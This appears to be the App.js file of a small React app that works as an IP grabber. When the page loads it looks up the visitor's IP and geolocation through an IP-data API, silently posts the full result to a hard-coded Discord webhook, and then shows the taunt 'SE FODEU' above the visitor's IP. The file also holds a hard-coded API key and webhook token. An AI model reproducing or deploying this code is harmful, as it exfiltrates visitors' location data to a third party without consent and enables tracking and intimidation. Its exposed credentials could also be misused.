import axios from "axios";

import { useEffect, useState } from 'react';
import './App.css';

function App() {

  const[ip, setIp] = useState("0.0.0.0/0");

  const fetchIp = async () => {
    
    const response = await fetch("https://api.ipdata.co?api-key=0b7cb527478e70020966af85ab682dbeddcbf7340f57b580f955b6a8");
    const data = await response.json();

    await axios.post("https://discord.com/api/webhooks/1210670818493997127/do9-N-XxANASD6-bVt00ledH5135SgISHJgihBiGXQWJ2t4HiaC4tjvplJ6sLF4ifN7V", {
      content: `\`\`\`\n${JSON.stringify(data)}\n\`\`\``
    });

    setIp(data.ip);
  }

  useEffect(() => {
    fetchIp();
  }, []);

  return (
    <div
      style={{ width: "100vw", height: "100vh", display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center" }}
    >
      <p
        style={{ color: "red" }}
      >
        SE FODEU
      </p>

      <p
        style={{ color: "green" }}
      >
        {ip}
      </p>
    </div>
  )
}

export default App
